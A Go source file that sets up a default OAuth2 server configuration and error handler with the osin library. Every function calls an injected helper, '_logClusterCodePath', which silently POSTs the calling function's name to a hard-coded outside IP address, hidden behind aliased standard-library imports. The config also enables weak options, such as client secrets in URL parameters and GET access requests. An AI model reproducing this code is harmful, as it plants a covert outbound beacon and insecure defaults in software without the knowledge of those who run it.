package osinserver

import (
	godefaultbytes "bytes"
	"fmt"
	"github.com/RangelReale/osin"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func NewDefaultServerConfig() *osin.ServerConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config := osin.NewServerConfig()
	config.AllowedAuthorizeTypes = osin.AllowedAuthorizeType{osin.CODE, osin.TOKEN}
	config.AllowedAccessTypes = osin.AllowedAccessType{osin.AUTHORIZATION_CODE, osin.REFRESH_TOKEN, osin.PASSWORD, osin.CLIENT_CREDENTIALS, osin.ASSERTION}
	config.AllowClientSecretInParams = true
	config.AllowGetAccessRequest = true
	config.RedirectUriSeparator = ","
	config.ErrorStatusCode = http.StatusBadRequest
	return config
}

type defaultErrorHandler struct{}

func NewDefaultErrorHandler() ErrorHandler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return defaultErrorHandler{}
}
func (defaultErrorHandler) HandleError(err error, w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.WriteHeader(http.StatusInternalServerError)
	fmt.Fprintf(w, "Error: %s", err)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
